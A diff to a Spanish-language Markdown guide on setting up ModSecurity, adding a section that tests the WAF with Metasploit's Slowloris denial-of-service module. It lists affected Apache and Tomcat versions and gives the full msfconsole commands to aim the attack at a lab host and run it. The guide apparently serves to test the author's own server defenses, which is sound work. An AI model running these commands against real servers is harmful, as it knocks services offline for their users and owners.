@@ -279,3 +279,26 @@ Renombrar archivo a *.conf
 ```bash
 $mv /etc/modsecurity/modsecurity.conf-recommended /etc/modsecurity/modsecurity.conf
 ```
+
+### Pruebas a mod_security
+
+**[Slowloris](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/auxiliary/dos/http/slowloris.md)**
+
+Es una herramienta del framework metasploit utilizada para hacer ataques DOS hacia:
+
++ Apache HTTP Server 1.x and 2.x
++ Apache Tomcat 5.5.0 through 5.5.29, 6.0.0 through 6.0.27 and 7.0.0 beta
+
+```bash
+sudo msfconsole
+use auxiliary/dos/http/slowloris
+show options #para ver la configuraciond el modulo
+set rhost 10.0.0.10
+set rport 443
+set ssl true
+set sockets 1000 #aunque la mv solo podrá tirar 225 por sus limitaciones de hw
+run #Ejecuta el ataque
+```
+
+![ataque_slowloris](/img/5.png)
+![ataque_slowloris2](/img/6.png)
